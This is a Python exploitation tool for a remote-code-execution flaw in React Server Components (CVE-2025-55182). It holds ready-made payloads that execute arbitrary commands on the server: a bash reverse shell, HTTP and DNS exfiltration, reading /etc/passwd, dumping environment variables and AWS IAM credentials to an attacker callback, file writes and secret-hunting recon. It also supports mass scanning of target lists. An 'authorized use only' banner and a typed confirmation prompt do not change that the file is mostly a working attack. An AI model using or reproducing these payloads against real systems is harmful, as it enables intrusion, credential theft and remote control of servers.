#!/usr/bin/env python3
"""
React2Shell (CVE-2025-55182) Exploitation Tool
A unified tool for detection and exploitation of React Server Components RCE
"""

import requests
import argparse
import json
import sys
import time
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
import base64
import concurrent.futures
import urllib.parse


@dataclass
class ScanResult:
    url: str
    vulnerable: bool
    rce_confirmed: bool = False
    response_time: float = 0
    error: Optional[str] = None
    evidence: Optional[str] = None


class React2Shell:
    """Main class for CVE-2025-55182 exploitation"""
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = True):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    @staticmethod
    def generate_payload(command: str, payload_type: str = "simple", callback: str = "") -> str:
        """Generate exploitation payloads"""
        
        base_gadget = {
            '0': '$1',
            '1': {
                'status': 'resolved_model',
                'reason': 0,
                '_response': '$4',
                'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
                'then': '$2:then'
            },
            '2': '$@3',
            '3': [],
            '4': {
                '_prefix': '',
                '_formData': {'get': '$3:constructor:constructor'},
                '_chunks': '$2:_response:_chunks',
            }
        }
        
        if payload_type == "simple":
            # Basic command execution (blind)
            prefix = f'process.mainModule.require("child_process").execSync("{command}");//'
        
        elif payload_type == "output":
            # Command with output exfiltration via HTTP callback
            prefix = f'process.mainModule.require("child_process").exec("{command}",(e,o)=>{{require("https").request("{callback}",{{method:"POST"}}).end(o)}});//'
        
        elif payload_type == "reverse_shell":
            # command format: "lhost:lport"
            lhost, lport = command.split(':')
            shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            prefix = f'process.mainModule.require("child_process").exec("bash -c \\"{shell_cmd}\\"");//'
        
        elif payload_type == "dns_exfil":
            # command format: "data:domain" or just "domain" (uses whoami)
            if ':' in command:
                data, domain = command.split(':', 1)
            else:
                data, domain = "whoami", command
            prefix = f'process.mainModule.require("child_process").execSync("nslookup $({data}).{domain}");//'
        
        elif payload_type == "http_exfil":
            # command format: "cmd:callback_url"
            cmd, callback_url = command.split(':', 1)
            prefix = f'process.mainModule.require("child_process").exec("{cmd}",(e,o)=>{{require("https").request("{callback_url}",{{method:"POST"}}).end(o)}});//'
        
        elif payload_type == "file_read":
            # command format: "filepath:callback_url"
            filepath, callback = command.split(':', 1)
            cmd = f"cat {filepath} | curl -X POST -d @- {callback}"
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");//'
        
        elif payload_type == "env_dump":
            # command is callback_url
            cmd = f"env | curl -X POST -d @- {command}"
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");//'
        
        elif payload_type == "aws_metadata":
            # command is callback_url
            cmd = (
                'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | '
                'xargs -I {} curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{} | '
                f'curl -X POST -d @- {command}'
            )
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");//'
        
        elif payload_type == "recon":
            recon = """echo "=== SYSTEM ===" && uname -a && whoami && id && echo "=== NETWORK ===" && ip a 2>/dev/null || ifconfig && echo "=== ENV ===" && env | grep -iE 'key|token|secret|pass' && echo "=== CONTAINER ===" && ls -la /.dockerenv 2>/dev/null && ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null"""
            if command:  # callback URL provided
                recon = f"({recon}) | curl -X POST -d @- {command}"
            prefix = f'process.mainModule.require("child_process").execSync("{recon}");//'
        
        elif payload_type == "stealth_beacon":
            # command is beacon domain
            prefix = f'process.mainModule.require("child_process").execSync("nslookup $(hostname).$(whoami).{command}");//'
        
        elif payload_type == "write_file":
            # command format: "filepath:content" (content will be base64 encoded)
            filepath, content = command.split(':', 1)
            content_b64 = base64.b64encode(content.encode()).decode()
            prefix = f'process.mainModule.require("fs").writeFileSync("{filepath}",Buffer.from("{content_b64}","base64"));//'
        
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        base_gadget['4']['_prefix'] = prefix
        return json.dumps(base_gadget, separators=(',', ':'))
    
    def _create_multipart(self, json_payload: str) -> Tuple[str, Dict]:
        """Create multipart/form-data payload"""
        boundary = "----WebKitFormBoundaryReact2Shell"
        
        body = f"""------{boundary}
Content-Disposition: form-data; name="0"

{json_payload}
------{boundary}
Content-Disposition: form-data; name="1"

"$@0"
------{boundary}--"""
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Next-Action': 'x'
        }
        
        return body, headers
    
    def _send_payload(self, url: str, payload: str) -> requests.Response:
        """Send payload to target"""
        body, headers = self._create_multipart(payload)
        
        return self.session.post(
            url,
            data=body,
            headers=headers,
            timeout=self.timeout,
            verify=self.verify_ssl,
            allow_redirects=False
        )
    
    def detect(self, url: str) -> ScanResult:
        """Detect if target is vulnerable"""
        try:
            start = time.time()
            
            # Use stealth detection payload
            payload = self.generate_payload("example.com", "stealth_beacon")
            response = self._send_payload(url, payload)
            
            response_time = time.time() - start
            
            # Analyze response for vulnerability indicators
            vulnerable = self._is_vulnerable(response)
            
            return ScanResult(
                url=url,
                vulnerable=vulnerable,
                response_time=response_time,
                evidence=f"Status: {response.status_code}, Size: {len(response.content)}"
            )
            
        except requests.exceptions.Timeout:
            return ScanResult(url=url, vulnerable=False, error="Timeout")
        except Exception as e:
            return ScanResult(url=url, vulnerable=False, error=str(e))
    
    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Analyze response for vulnerability indicators"""
        indicators = [
            response.status_code in [200, 500],
            'application/json' in response.headers.get('Content-Type', ''),
            len(response.content) > 0
        ]
        return sum(indicators) >= 2
    
    def exploit(self, url: str, command: str, payload_type: str = "simple", callback: str = "") -> ScanResult:
        """Execute exploitation"""
        try:
            payload = self.generate_payload(command, payload_type, callback)
            response = self._send_payload(url, payload)
            
            rce_confirmed = response.status_code in [200, 500]
            
            return ScanResult(
                url=url,
                vulnerable=True,
                rce_confirmed=rce_confirmed,
                evidence=f"Executed: {command[:50]}..."
            )
            
        except Exception as e:
            return ScanResult(
                url=url,
                vulnerable=True,
                rce_confirmed=False,
                error=str(e)
            )
    
    def scan_multiple(self, urls: List[str], workers: int = 10) -> List[ScanResult]:
        """Scan multiple URLs in parallel"""
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self.detect, url): url for url in urls}
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    url = futures[future]
                    results.append(ScanResult(url=url, vulnerable=False, error=str(e)))
        
        return results
    
    def run_impact_assessment(self, url: str, callback: str) -> Dict:
        """Run comprehensive impact assessment"""
        print("\n[*] Running Impact Assessment...")
        print(f"[*] Target: {url}")
        print(f"[*] Callback: {callback}\n")
        
        tests = [
            ("System Info", "recon", callback),
            ("Environment Vars", "env_dump", callback),
            ("File Access", "file_read", f"/etc/passwd:{callback}/file"),
            ("AWS Metadata", "aws_metadata", callback),
            ("DNS Beacon", "stealth_beacon", callback),
        ]
        
        results = {
            'target': url,
            'timestamp': time.time(),
            'tests': []
        }
        
        for test_name, ptype, cmd in tests:
            print(f"[*] Testing: {test_name}")
            try:
                result = self.exploit(url, cmd, ptype)
                results['tests'].append({
                    'name': test_name,
                    'success': result.rce_confirmed,
                    'details': result.evidence
                })
                time.sleep(0.5)
            except Exception as e:
                results['tests'].append({
                    'name': test_name,
                    'success': False,
                    'error': str(e)
                })
        
        return results


def load_targets(filename: str) -> List[str]:
    """Load targets from file"""
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]


def print_banner():
    """Print tool banner"""
    print("""
╔═══════════════════════════════════════════════════════════╗
║          FiberBreak - React2Shell Exploitation Tool       ║
║              CVE-2025-55182 (CVSS 10.0)                   ║
║                                                           ║
║         WARNING: Educational and authorized use only      ║
╚═══════════════════════════════════════════════════════════╝
    """)

def print_results(results: List[ScanResult]):
    """Print scan results summary"""
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    total = len(results)
    vulnerable = sum(1 for r in results if r.vulnerable)
    rce = sum(1 for r in results if r.rce_confirmed)
    
    print(f"\nTotal scanned: {total}")
    print(f"Vulnerable: {vulnerable}")
    print(f"RCE confirmed: {rce}")
    
    if vulnerable > 0:
        print("\n[!] VULNERABLE TARGETS:")
        for r in results:
            if r.vulnerable:
                status = "RCE✓" if r.rce_confirmed else "VULN"
                print(f"  [{status}] {r.url}")


def print_impact_summary(results: Dict):
    """Print impact assessment summary"""
    print("\n" + "="*60)
    print("IMPACT ASSESSMENT SUMMARY")
    print("="*60)
    
    total = len(results['tests'])
    successful = sum(1 for t in results['tests'] if t['success'])
    
    print(f"\nTests: {total}")
    print(f"Successful: {successful}")
    print(f"Success rate: {(successful/total)*100:.1f}%")
    
    print("\n[CONFIRMED CAPABILITIES]:")
    for test in results['tests']:
        status = "✓" if test['success'] else "✗"
        print(f"  [{status}] {test['name']}")
    
    # Severity assessment
    if successful >= 4:
        severity = "CRITICAL"
    elif successful >= 2:
        severity = "HIGH"
    else:
        severity = "MEDIUM"
    
    print(f"\nSeverity: {severity}")


def main():
    parser = argparse.ArgumentParser(
        description='React2Shell (CVE-2025-55182) Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Detect vulnerability
  %(prog)s -u https://target.com detect
  
  # Scan multiple targets
  %(prog)s -l targets.txt detect
  
  # Execute command (blind RCE)
  %(prog)s -u https://target.com exploit -c "whoami"
  
  # Execute with output via HTTP callback
  %(prog)s -u https://target.com exploit -c "whoami" -t output --callback https://callback.com
  
  # Execute with output via DNS (best for bug bounty)
  %(prog)s -u https://target.com exploit -c "whoami:attacker.oastify.com" -t dns_exfil
  
  # Reverse shell
  %(prog)s -u https://target.com exploit -c "10.10.10.10:4444" -t reverse_shell
  
  # Read file with HTTP exfil
  %(prog)s -u https://target.com exploit -c "/etc/passwd:https://callback.com" -t file_read
  
  # Write file
  %(prog)s -u https://target.com exploit -c "/tmp/test.txt:Hello World" -t write_file
  
  # Impact assessment
  %(prog)s -u https://target.com assess --callback https://attacker.com
  
Payload types:
  simple          - Execute command (blind, no output)
  output          - Execute with HTTP callback output (requires --callback)
  dns_exfil       - DNS exfiltration (format: cmd:domain or just domain for whoami)
  http_exfil      - HTTP exfiltration (format: cmd:callback_url)
  reverse_shell   - Bash reverse shell (format: lhost:lport)
  file_read       - Read file (format: filepath:callback)
  write_file      - Write file (format: filepath:content)
  env_dump        - Dump environment vars (format: callback)
  aws_metadata    - AWS metadata exfiltration (format: callback)
  recon           - System reconnaissance (format: callback)
  stealth_beacon  - DNS beacon (format: domain)
        """
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-u', '--url', help='Target URL')
    target_group.add_argument('-l', '--list', help='File with target URLs')
    
    # Operation mode
    parser.add_argument('mode', choices=['detect', 'exploit', 'assess'],
                       help='Operation mode')
    
    # Exploit options
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('-t', '--type', default='simple',
                       choices=['simple', 'output', 'reverse_shell', 'dns_exfil', 'http_exfil',
                               'file_read', 'write_file', 'env_dump', 'aws_metadata', 
                               'recon', 'stealth_beacon'],
                       help='Payload type (default: simple)')
    
    # Assessment options
    parser.add_argument('--callback', help='Callback server for output/assessment')
    
    # General options
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads for parallel scanning (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-verify-ssl', action='store_true',
                       help='Disable SSL verification')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Validation
    if args.mode == 'exploit' and not args.command:
        parser.error("exploit mode requires --command")
    
    if args.mode == 'assess' and not args.callback:
        parser.error("assess mode requires --callback")
    
    if args.type == 'output' and not args.callback:
        parser.error("output payload type requires --callback")
    
    # Confirmation for exploit mode
    if args.mode in ['exploit', 'assess']:
        print("[!] This will perform REAL exploitation")
        response = input("[?] Confirm you have authorization (yes/no): ")
        if response.lower() != 'yes':
            print("[!] Operation cancelled")
            sys.exit(0)
    
    # Initialize tool
    tool = React2Shell(
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl
    )
    
    # Get targets
    if args.url:
        targets = [args.url]
    else:
        targets = load_targets(args.list)
        print(f"[*] Loaded {len(targets)} targets\n")
    
    # Execute operation
    if args.mode == 'detect':
        if len(targets) == 1:
            result = tool.detect(targets[0])
            print(f"\n[{'✓' if result.vulnerable else '✗'}] {result.url}")
            if result.vulnerable:
                print(f"    Evidence: {result.evidence}")
            results = [result]
        else:
            results = tool.scan_multiple(targets, workers=args.threads)
            print_results(results)
    
    elif args.mode == 'exploit':
        results = []
        
        # Warn user about blind RCE if using simple type
        if args.type == 'simple' and not args.callback:
            print("\n[!] WARNING: Using 'simple' payload type = BLIND RCE")
            print("[!] Command will execute but you won't see output!")
            print("\n[i] To see command output, use one of these:")
            print("    1. Add: -t output --callback http://YOUR_IP:8080")
            print("    2. Add: -t dns_exfil -c 'whoami:attacker.oastify.com'")
            print("    3. Add: -t write_file -c '/tmp/output.txt:content'\n")
            
            if input("[?] Continue with blind RCE anyway? (yes/no): ").lower() != 'yes':
                print("[!] Operation cancelled")
                sys.exit(0)
        
        for target in targets:
            print(f"[*] Exploiting: {target}")
            result = tool.exploit(target, args.command, args.type, args.callback or "")
            print(f"[{'✓' if result.rce_confirmed else '✗'}] RCE {'confirmed' if result.rce_confirmed else 'failed'}")
            
            # Additional instructions based on payload type
            if result.rce_confirmed:
                if args.type == 'dns_exfil':
                    domain = args.command.split(':')[-1]
                    print(f"    Check DNS logs at {domain} for exfiltrated data")
                elif args.type in ['output', 'http_exfil', 'file_read', 'env_dump', 'aws_metadata', 'recon']:
                    print(f"    Check callback server {args.callback} for command output")
                elif args.type == 'reverse_shell':
                    print(f"    Check your listener for incoming connection")
                elif args.type == 'write_file':
                    filepath = args.command.split(':')[0]
                    print(f"    File written to {filepath}")
            
            results.append(result)
    
    elif args.mode == 'assess':
        results = tool.run_impact_assessment(args.url, args.callback)
        print_impact_summary(results)
    
    # Save results
    if args.output:
        if args.mode == 'assess':
            output_data = results
        else:
            output_data = [
                {
                    'url': r.url,
                    'vulnerable': r.vulnerable,
                    'rce_confirmed': r.rce_confirmed,
                    'response_time': r.response_time,
                    'error': r.error,
                    'evidence': r.evidence
                }
                for r in results
            ]
        
        with open(args.output, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n[+] Results saved to: {args.output}")
    
    # Exit code
    if args.mode in ['detect', 'exploit']:
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        sys.exit(0 if vulnerable_count == 0 else 1)


if __name__ == '__main__':
    main()
